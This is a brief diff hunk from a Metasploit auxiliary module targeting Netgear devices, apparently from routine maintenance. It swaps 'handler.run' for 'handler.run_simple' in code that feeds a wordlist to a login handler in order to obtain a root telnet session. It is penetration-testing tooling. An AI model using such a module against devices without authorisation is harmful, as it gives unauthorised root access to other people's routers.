@@ -248,7 +248,7 @@ class MetasploitModule < Msf::Auxiliary
     file_handle.close
     handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
     print_status("Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user")
-    handler.run
+    handler.run_simple
     File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Remove the file once we are done.
   end
 end
